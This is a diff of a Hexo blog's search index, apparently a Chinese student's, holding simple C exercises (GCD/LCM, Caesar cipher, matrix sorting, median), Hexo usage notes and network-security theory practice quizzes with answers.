+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">int main() </span><br><span class="line">&#123; int Gcd(int,int); </span><br><span class="line">int m,n; </span><br><span class="line">scanf(&quot;%d%d&quot;,&amp;m,&amp;n); </span><br><span class="line">printf(&quot;%d&quot;,m*n/Gcd(m,n)); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Gcd(int x,int y) </span><br><span class="line">&#123; </span><br><span class="line">int r; </span><br><span class="line">r=x%y; </span><br><span class="line"> while (r!=0)&#123; </span><br><span class="line">  x=y; </span><br><span class="line">  y=r; </span><br><span class="line">  r=x%y; </span><br><span class="line"> &#125; </span><br><span class="line">return y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Misc</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/09/18/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Read more</title>
-    <url>/2021/09/19/more/</url>
-    <content><![CDATA[<p>摘要</p>
-<span id="more"></span>
-<p>正文</p>
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>凯撒密码C语言代码</title>
+      <link href="/2021/12/12/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/"/>
+      <url>/2021/12/12/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">int i=0,j,k,key;</span><br><span class="line">char c,a[100];</span><br><span class="line">scanf(&quot;%d &quot;,&amp;key);</span><br><span class="line">while((a[i]=getchar())!=&#x27;\n&#x27;)</span><br><span class="line">i++;</span><br><span class="line"></span><br><span class="line">for(j=0;j&lt;i;j++)</span><br><span class="line">if(a[j]&gt;=&#x27;A&#x27;&amp;&amp;a[j]&lt;=&#x27;Z&#x27; || a[j]&gt;=&#x27;a&#x27;&amp;&amp;a[j]&lt;=&#x27;z&#x27;)&#123;</span><br><span class="line">if(a[j]&gt;=&#x27;A&#x27;&amp;&amp;a[j]&lt;=&#x27;Z&#x27;)&#123;</span><br><span class="line">if(a[j]+key%26&gt;&#x27;Z&#x27;)</span><br><span class="line">a[j]+=key%26-26;</span><br><span class="line">else</span><br><span class="line">a[j]+=key%26;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if(a[j]+key%26&gt;&#x27;z&#x27;)</span><br><span class="line">a[j]+=key%26-26;</span><br><span class="line">else</span><br><span class="line">a[j]+=key%26;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(j=0;j&lt;i;j++)</span><br><span class="line">printf(&quot;%c&quot;,a[j]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Text</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>text</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于搭建Hexo博客</title>
-    <url>/2021/09/18/%E5%85%B3%E4%BA%8E%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>**<u><a href="https://www.cnblogs.com/huanhao/p/markdown.html">https://www.cnblogs.com/huanhao/p/markdown.html</a></u>**直接看这个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean                           #清除缓存</span><br><span class="line">hexo g                               #生成页面</span><br><span class="line">hexo d                               #部署到github</span><br><span class="line">hexo s                               #本地预览</span><br><span class="line">hexo new &quot;标题&quot;                      #新建博客</span><br><span class="line">##小标题内容                          #小标题</span><br><span class="line">###小小标题内容                       #小小标题</span><br><span class="line">[自注网页名称]（网址）                 #在博客中添加网站链接</span><br><span class="line">！[](网址)                           #在博客中添加图片</span><br><span class="line"></span><br><span class="line">**设置**	**Description**	    **默认**</span><br><span class="line">layout	           layout	    post 或 page</span><br><span class="line">title	           文章标题	     文档名</span><br><span class="line">date	           创建日期	    文档的创建日期</span><br><span class="line">updated	           修改日期	    文档的修改日期</span><br><span class="line">comment            是否开启评论	      true</span><br><span class="line">tags	           标签	              NULL</span><br><span class="line">categories	   分类	              NULL</span><br><span class="line">permalink	   url 中的名字	     文档名</span><br><span class="line">thumbnail	   文章缩略图	      NULL</span><br><span class="line">banner	       文章缩略图&amp;文章首部      NULL</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>矩阵各列从大到小排序</title>
+      <link href="/2021/12/08/%E7%9F%A9%E9%98%B5%E5%90%84%E5%88%97%E4%BB%8E%E5%A4%A7%E5%88%B0%E5%B0%8F%E6%8E%92%E5%BA%8F/"/>
+      <url>/2021/12/08/%E7%9F%A9%E9%98%B5%E5%90%84%E5%88%97%E4%BB%8E%E5%A4%A7%E5%88%B0%E5%B0%8F%E6%8E%92%E5%BA%8F/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">int i,j,k,m,n,t;</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;m,&amp;n);//m行n列 </span><br><span class="line">int a[m][n];</span><br><span class="line">for(i=0;i&lt;m;i++)//输入矩阵</span><br><span class="line">for(j=0;j&lt;n;j++)</span><br><span class="line">scanf(&quot;%d&quot;,&amp;a[i][j]); </span><br><span class="line"></span><br><span class="line">for(j=0;j&lt;n;j++)//各列分别排序 </span><br><span class="line">for(i=0;i&lt;m;i++)</span><br><span class="line">for(k=i+1;k&lt;m;k++)</span><br><span class="line">if(a[i][j]&lt;a[k][j])</span><br><span class="line">t=a[i][j],</span><br><span class="line">a[i][j]=a[k][j],</span><br><span class="line">a[k][j]=t;</span><br><span class="line"></span><br><span class="line">for(i=0;i&lt;m;i++)//输出矩阵</span><br><span class="line">for(j=0;j&lt;n;j++)&#123;</span><br><span class="line">printf(&quot;%d &quot;,a[i][j]);</span><br><span class="line">if(j==n-1)</span><br><span class="line">printf(&quot;\n&quot;); </span><br><span class="line">&#125;</span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Diary</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>凯撒密码C语言代码</title>
-    <url>/2021/12/12/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main ()</span><br><span class="line">&#123;	</span><br><span class="line">	int i=0,j,k,key;</span><br><span class="line">	char c,a[100];</span><br><span class="line">scanf(&quot;%d &quot;,&amp;key);</span><br><span class="line">	while((a[i]=getchar())!=&#x27;\n&#x27;)</span><br><span class="line">		i++;</span><br><span class="line">		</span><br><span class="line">	for(j=0;j&lt;i;j++)</span><br><span class="line">		if(a[j]&gt;=&#x27;A&#x27;&amp;&amp;a[j]&lt;=&#x27;Z&#x27; || a[j]&gt;=&#x27;a&#x27;&amp;&amp;a[j]&lt;=&#x27;z&#x27;)&#123;</span><br><span class="line">			if(a[j]&gt;=&#x27;A&#x27;&amp;&amp;a[j]&lt;=&#x27;Z&#x27;)&#123;</span><br><span class="line">				if(a[j]+key%26&gt;&#x27;Z&#x27;)</span><br><span class="line">					a[j]+=key%26-26;</span><br><span class="line">				else</span><br><span class="line">					a[j]+=key%26;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				if(a[j]+key%26&gt;&#x27;z&#x27;)</span><br><span class="line">					a[j]+=key%26-26;</span><br><span class="line">				else</span><br><span class="line">					a[j]+=key%26;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	for(j=0;j&lt;i;j++)</span><br><span class="line">		printf(&quot;%c&quot;,a[j]);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 矩阵 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>找中位数</title>
+      <link href="/2021/12/05/%E6%89%BE%E4%B8%AD%E4%BD%8D%E6%95%B0/"/>
+      <url>/2021/12/05/%E6%89%BE%E4%B8%AD%E4%BD%8D%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123; </span><br><span class="line">int n,i,j,t;</span><br><span class="line">float a[1000],num;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">for(i=0;i&lt;n;i++)</span><br><span class="line">scanf(&quot;%f&quot;,&amp;a[i]);</span><br><span class="line">for(j=0;j&lt;n;j++)</span><br><span class="line">for(i=j;i&lt;n;i++)</span><br><span class="line">if(a[i]&lt;a[j])</span><br><span class="line">t=a[j],</span><br><span class="line">a[j]=a[i],</span><br><span class="line">a[i]=t;</span><br><span class="line">if(n%2!=0)</span><br><span class="line">num=a[(n-1)/2];</span><br><span class="line">else</span><br><span class="line">num=(a[n/2]+a[n/2-1])/2;</span><br><span class="line">printf(&quot;%.1f&quot;,num);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>初入攻防世界</title>
-    <url>/2021/09/20/%E5%88%9D%E5%85%A5%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
-    <content><![CDATA[<p><img src="https://songkaiai.github.io/2021/09/20/%E5%88%9D%E5%85%A5%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/image.jpg" alt="初入攻防世界"><br>今天在攻防世界做了几题，慢慢摸索学习中</p>
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>黑盾杯预赛结果</title>
+      <link href="/2021/12/01/%E9%BB%91%E7%9B%BE%E6%9D%AF100%E9%A2%98%E7%BB%93%E6%9E%9C/"/>
+      <url>/2021/12/01/%E9%BB%91%E7%9B%BE%E6%9D%AF100%E9%A2%98%E7%BB%93%E6%9E%9C/</url>
+      
+        <content type="html"><![CDATA[<p>压线</p><p>感觉结束了</p><span id="more"></span><p>1．网络安全的基础属性是（  ）</p><p>A. 机密性     B. 可用性      C. 完整性     D. 以上3项都是</p><p>2．橘皮书定义了4个安全层次，从D层（最低保护层）到A层（验证性保护层），其中D级的安全保护是最低的，属于D级的系统是不安全的，以下操作系统中属于D级安全的是（  ）</p><p>A. 运行非UNIX的Macin tosh机         B. 运行Linnx的PC机</p><p>C. UNIX系统                          D. XENIX</p><p>3．网络安全最终是一个折衷的方案，即安全强度和安全操作代价的折衷除增加安全设施投资外，还应考虑（  ）</p><p>A. 用户的方便性                              B. 管理的复杂性</p><p>C. 对现有系统的影响及对不同平台的支持        D. 上面3项都是</p><p>4．下列对访问控制影响不大的是（  ）</p><p>A. 主体身份     B. 客体身份      C. 访问类型     D. 主体与客体的类型</p><p>5．在开放系统互连环境中，两个N层实体进行通信，它们可能用到的服务是（）</p><p>A. N-1层是提供的服务                 B. N层是提供的服务</p><p>C. N+1层是提供的服务                 D. 以上3项都不是</p><p>6．路由控制机制用以防范（  ）</p><p>A. 路由器被攻击者破坏                        B. 非法用户利用欺骗性的路由协议</p><p>C. 在网络层次进行分析；防止非法信息通过路由  D. 以上3项都不是</p><p>7．IpSee协议中负责对IP数据报加密的部分是（  ）</p><p>A. 封装安全负载（ESP）              B. 鉴别包头（AH）</p><p>C. Internet密钥交换（IKE）            D. 以上都不是</p><p>8．GRE协议（  ）</p><p>A. 既封装、又加密                 B. 只封装、不加密   </p><p>C. 不封装、只加密                 D. 不封装、不加密</p><p>9．数据保密性安全服务的基础是（  ）</p><p>A. 数据完整性机制    B. 数字签名机制     C. 访问控制机制    D. 加密机制</p><p>10．包过滤的局限性不包括（  ）</p><p>A. 不能进行内容控制                B. 过滤规则制定比较复杂</p><p>C. 访问控制机制                    D. 不支持实现NAT</p><p>答案：1.D 2.A 3.D 4.D 5.A 6.B 7.A 8.B 9.D 10.D</p><p>1．密码学的目的是（  ）</p><p>A. 研究数据加密    B. 研究数据解密    C. 研究数据保密     D. 研究信息安全</p><p>2．从安全属性对各种网络攻击进行分类。阻断攻击是针对（  ）</p><p>A. 机密性的攻击    B. 可用性的攻击     C. 完整性的攻击     D. 真实性的攻击</p><p>3．Kerberos的设计目标不包括（  ）</p><p>A. 认证       B. 授权       C. 记账       D. 加密</p><p>4．ISO7408-2从体系结构的观点描述了5种可选的安全服务，以下不属于这5种安全服务的是（  ）</p><p>A. 身份鉴别      B. 数据包过滤      C. 授权控制       D. 数据完整性</p><p>5．CA属于ISO安全体系结构中定义的（  ）</p><p>A. 认证交换机制     B. 通信业务填充机制     C. 路由控制机制     D. 公证机制</p><p>6．分组过滤型防火墙原理上是基于（  ）</p><p>  A. 物理层分析的技术           B. 数据链路层分析的技术</p><p>C. 网络层分析的技术           D. 应用层分析的技术</p><p>7．属于第二层的VPN隧道协议有（  ）</p><p>  A. IPSec       B. PPIP       C. GRE      D. 以上皆不是</p><p>8．GRE协议的乘客协议是（  ）</p><p>  A. IP          B. IPX       C. AppleTalk      D. 上述皆可</p><p>9．误用检测的优点不包括（  ）</p><p>  A. 检测准确度高                 B. 能够检测出新的网络攻击 </p><p>C. 便于系统维护                 D. 技术相对成熟</p><p>10．对非军事区DMZ而言，正确的解释是(  )</p><p>   A. DMZ是一个非真正可信的网络部分 </p><p>B. DMZ网络访问控制策略决定允许或禁止进入DMZ通信 </p><p>C. 允许外部用户访问DMZ系统上合适的服务  </p><p>D. 以上3项都是</p><p>答案： 1．C   2. B   3. B   4. B   5. D  6. C   7. B   8. D   9. B   10. D</p><p>1．一般而言，Internet防火墙建立在一个网络在（  ）</p><p>A. 内部子网之间传送信息的中枢           B. 每个子网的内部</p><p>C. 内部网络与外部网络的交叉点          D. 部分内部网络与外部内部的接合处</p><p>2．从安全属性对各种网络攻击进行分类，截获攻击是针对（  ）</p><p>A. 机密性的攻击    B. 可用性的攻击     C. 完整性的攻击    D. 真实性的攻击</p><p>3．数字签名要预先使用单向Hash函数进行处理的原因是（  ）</p><p>A. 多一道加密工序使密文更难破译       </p><p> B. 提高密文的计算速度</p><p>C. 缩小签名密文的长度，加快数字签名的验证签名的运算速度</p><p>D. 保证密文能正确的还原成明文</p><p>4．一个报文的端到端传递内OSZ模型的（  ）</p><p>A. 网络层负责处理                  B. 传输层负责处理</p><p>C. 会话层负责处理                  D. 表示层负责处理</p><p>5．ISU7498-2描述了8种特定的安全机制，这8种特定的安全机制是为5种特定的安全服务设置的，以下不属于这8种安全机制的是（  ）</p><p>A. 安全标记机制     B. 加密机制     C. 数字签名机制     D. 访问控制机制</p><p>6．用于实现身份鉴别的安全机制是（  ）</p><p>A. 加密机制的数字签名机制               B. 加密机制的访问控制机制</p><p>C. 数字签名机制和路由控制机制           D. 访问控制机制的路由控制机制</p><p>7．SSL产生会话密钥的方式是（  ）</p><p>A. 从密钥管理数据库中请求获得           B. 每一台客户机分配一个密钥的方式</p><p>C. 随机由客户机产生并加密后通知服务器   D. 由服务器产生并分配给客户机</p><p>8．PPTP客户端使用（  ）</p><p>A. TCP协议建立连接                  B. UDP协议建立连接     </p><p>C. L2TP协议建立连接                 D. 以上皆不是</p><p>9．拒绝服务攻击的后果是（  ）</p><p>A. 信息不可用     B. 应用程序不可用     C. 阻止通信     D. 上面几项都是</p><p>10．现在防火墙呢中，最常用的技术是（  ）</p><p>A. 代理服务器技术                 B. 状态检测包过滤技术     </p><p>C. 应用网关技术                   D. NAT技术</p><p>答案：1.C 2.A 3.C 4.B 5.A 6.A 7.C 8.A 9.D 10.B</p><p>1．计算机病毒程序隐藏在计算机系统的（  ）</p><p>A. 内存中      B. 软盘中       C. 存储介质中      D. 网络中</p><p>2．可信计算机系统评估准则（Trusted  Computer  System   Evaluation  Criteria  TCSEC）共分为4大类（  ）</p><p>A. 7级       B.8级         C.5级         D.6级</p><p>3．对目标的攻击威胁通常通过代理实现，而代理需要的特性包括（  ）</p><p>A. 访问目标的能力                B. 对目标发出威胁的动机</p><p>C. 有关目标的知识                D. 上面3项都是</p><p>4．从安全属性对各种网络攻击进行分类，截获攻击是针对（  ）</p><p>A. 机密性的攻击     B. 攻击性的攻击     C. 完整性的攻击     D. 真实性的攻击</p><p>5．身份鉴别是安全服务中心的重要一环，以下关于身份鉴别的叙述不正确的是（  ）</p><p>A. 身份鉴别是授权控制的基础               </p><p>B. 身份鉴别一般不用提供双向的认证</p><p>C. 目前一般采用基于对称密钥加密或公开密钥加密的方法</p><p>D. 数字签名机制是实现身份鉴别的重要机制</p><p>6．Web中使用的安全协议有（  ）</p><p>A. PEM   SSL                    B. S-HTTP   S/MIME    </p><p>C. SSL    S-HTTP                D. S/MIME   SSL</p><p>7．ISO定义的安全体系结构中包含（  ）</p><p>A. 4种安全服务     B. 5种安全服务     C. 6种安全服务      D. 7种安全服务</p><p>8．传输层保护的网络采用的主要技术是建议在（  ）</p><p>A. 可靠的传输服务基础上的安全套接字层SSL协议</p><p>B. 不可靠的传输服务基础上的S-HTTP协议</p><p>C. 可靠的传输服务基础上的S-HTTP协议</p><p>D. 不可靠的传输服务基础上的安全套接字层SSL协议</p><p>9．防火墙在网络层中根据数据包中包头信息有选择地实施允许和阻断。这种技术是（  ）</p><p>A. 应用网管技术   B. 状态检测技术     C. 包过滤技术     D. 代理服务器技术</p><p>10．误用检测的优点不包括（  ）</p><p>A. 检测准确度高                     B. 能够检测出新的网络攻击</p><p>C. 便于系统维护                     D. 技术相对成熟的网络攻击</p><p>答案：1.C 2.A 3.D 4.A 5.B 6.C 7.B 8.A 9.C 10.B</p><p>1．  访问控制需要确定（  ）</p><p>A. 用户权限                   B. 可给予那些主体访问控制权利</p><p>C. 可被用户访问的资源         D. 系统是否遭入侵</p><p>2．  威胁是一个可能破坏信息系统环境安全的动作或事件，威胁包括（  ）</p><p>A. 目标       B. 代理       C. 事件     D. 上面三项都是</p><p>3．完整性服务提供信息的正确性，为了对抗篡改攻击该服务必须和（  ）</p><p>  A. 机密性服务配合工作       B. 可用性服务配合工作</p><p>C. 可审性配合工作           D. 以上三项都是</p><p>4．基于通信双方公共拥有的但是不为别人知道的秘密，利用计算机强大的计算能力，以该机密作为加密和密钥认证是（  ）</p><p>  A. 公钥认证     B.  零知识认证    C.  共享密钥认证     D. 口令认证</p><p>5．ISO安全体系结构中的对象认证安全服务使用（  ）</p><p>A. 加密机制完成                   B. 数字签名机制完成 </p><p> C. 访问控制机制完成               D. 数据完整性机制完成</p><p>6．在ISO/OSI定义的安全体系结构中没有规定（  ）</p><p>A. 对象认证服务                B. 访问控制安全服务</p><p> C. 数据保密性安全服务          D. 数据可用性安全服务</p><p>7．SSL产生绘画密钥的方式是（  ）</p><p>A. 从密钥管理数据库中获得             </p><p>B. 每一台客户机分配一个密钥的方式</p><p>C. 随机由客户机产生并加密后通知服务器 </p><p>D. 由服务器产生并分配给客户机</p><p>8．属于第二层的VPN隧道协议有（  ）</p><p>A. IPsec      B. PPTP      Ｃ. GRE　　 Ｄ. 以上皆不是</p><p>9．入侵检测系统的检测分析技术主要有两大类它们是（　）</p><p>Ａ. 特征检测和模型推理　         Ｂ. 异常检测和误用检测　</p><p>Ｃ. 异常检测和概率检测           Ｄ. 主机检测和网络检测</p><p>10．为了降低风险不建议使用的Ｉｎｔｅｒｎｅｔ服务是（　）</p><p>　Ａ. Web服务　   B. 外部访问内部系统　　 C. 内部访问internet     D. FTP服务</p><p> 答案：1.B  2.D 3.C  4.C  5.B  6.D  7.C  8.B  9.B  10.D</p>]]></content>
+      
+      
       <categories>
-        <category>Diary</category>
+          
+          <category> Diary </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>去除Next主题博客点击阅读全文后的#more标签</title>
-    <url>/2021/09/27/%E5%8E%BB%E9%99%A4%E5%8D%9A%E5%AE%A2%E7%82%B9%E5%87%BB%E9%98%85%E8%AF%BB%E5%85%A8%E6%96%87%E5%90%8E%E7%9A%84more%E6%A0%87%E7%AD%BE/</url>
-    <content><![CDATA[<p>点击Next主题的产生的 <strong>阅读全文</strong> 按钮后，进入的文章会打上 <strong>#more标签</strong><br>这对在博客中使用评论区很不友好，某些评论区因为这样，一篇文章有两个页面，评论区也会分为两部分<br><img src="https://s3.bmp.ovh/imgs/2021/09/65cd356d966d90bf.png" alt="more标签"><br>我们只需要打开 <strong>\theme\next\layout\ _macro\post.njk</strong>(记事本打开就行)</p>
-<p>找到代码 <code>a class=&quot;btn&quot; href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;#more&quot; rel=&quot;contents&quot;</code></p>
-<p>把代码中的#more删掉就行了</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>黑盾杯准备</title>
+      <link href="/2021/11/28/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%87%86%E5%A4%87/"/>
+      <url>/2021/11/28/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%87%86%E5%A4%87/</url>
+      
+        <content type="html"><![CDATA[<p>1．  网络安全是在分布网络环境中对（  ）</p><p>A. 信息载体提供安全保护                B. 信息的处理、传输提供安全保护</p><p>C. 信息的存储、访问提供安全保护        D. 上面3项都是</p><p>2．  对攻击可能性的分析在很大程度上带有（  ）</p><p>A. 客观性       B. 主观性       C. 盲目性       D. 以上3项</p><span id="more"></span><p>3．  机密性服务提供信息的保密，机密性服务包括（  ）</p><p>A. 文件机密性      B. 信息传输机密性     C. 通信流的机密性     D. 以上3项</p><p>4．  网络协议的关键成分是（  ）</p><p>A. 硬件、软件与数据                B. 语法、语义、体系结构</p><p>C. 语法、定时、层次结构            D. 语法、语义、定时</p><p>5．  可以被数据完整性机制防止的攻击方式是（  ）</p><p>A. 假冒源地址或用户的地址欺骗攻击</p><p>B. 抵赖做过信息的递交行为</p><p>C. 数据中途被攻击者窃听获取</p><p>D. 数据在途中被攻击者篡改或破坏</p><p>6．  VPN的加密手段是（  ）</p><p>A. 具有加密功能的防火墙</p><p>B. 带有加密功能的路由器</p><p>C. VPN内的各台主机对各自的信息进行相应的加密</p><p>D. 单独的加密设备</p><p>7．  通常所说的移动VPN是指（  ）</p><p>A. Access VPN    B. Intranel VPN    C. Extranet VPN    D. 以上都不是</p><p>8．入侵检测系统的检测分析技术主要有两大类，它们是（  ）</p><p>A. 特征检测和模型检测          B. 异常检测和误用检测</p><p>C. 异常检测和概率检测          D. 主机检测和网络检测</p><p>9．身份鉴别是安全服务中的重要一环，以下关于身份鉴别的叙述不正确的是（  ）</p><p>A. 身份鉴别是授权控制的基础</p><p>B. 身份鉴别一般不用提供双向认证</p><p>C. 目前一跟般采用基于对称密钥或公开密钥加密的方法</p><p>D. 数据签名机制是实现身份鉴别的重要机制</p><p>10．对动态网络地址转换（NAT），不正确的说法是（  ）</p><p>A. 将很多内部地址映射到单个真实地址</p><p>B. 外部网络地址和内部地址一对一的映射</p><p>C. 最多可有64000个同时的动态NAT连接</p><p>D. 每个连接使用一个端口</p><p>答案：1.D 2.B 3.D 4.D 5.D 6.C 7.A 8.B 9.B 10.B</p>]]></content>
+      
+      
       <categories>
-        <category>Hexo</category>
+          
+          <category> Diary </category>
+          
       </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>Next主题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>取高低四位</title>
-    <url>/2021/11/07/%E5%8F%96%E9%AB%98%E4%BD%8E%E5%9B%9B%E4%BD%8D/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int y;</span><br><span class="line">    y=32767;  //其实这个数只要保证右边4位全1,结果就是15,</span><br><span class="line">    y&lt;&lt;=sizeof(int)*8-4;</span><br><span class="line">    y&gt;&gt;=sizeof(int)*8-4;</span><br><span class="line">    printf(&quot;右4位: %d\n&quot;,y);//  结果为15</span><br><span class="line">    y=-32768;//这个数只要是负数,那么结果应该&gt;=8</span><br><span class="line">    y&gt;&gt;=sizeof(int)*8-4;</span><br><span class="line">    printf(&quot;左4位: %d\n&quot;,y); // 结果为15</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>生成随机数</title>
+      <link href="/2021/11/24/%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
+      <url>/2021/11/24/%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
+      
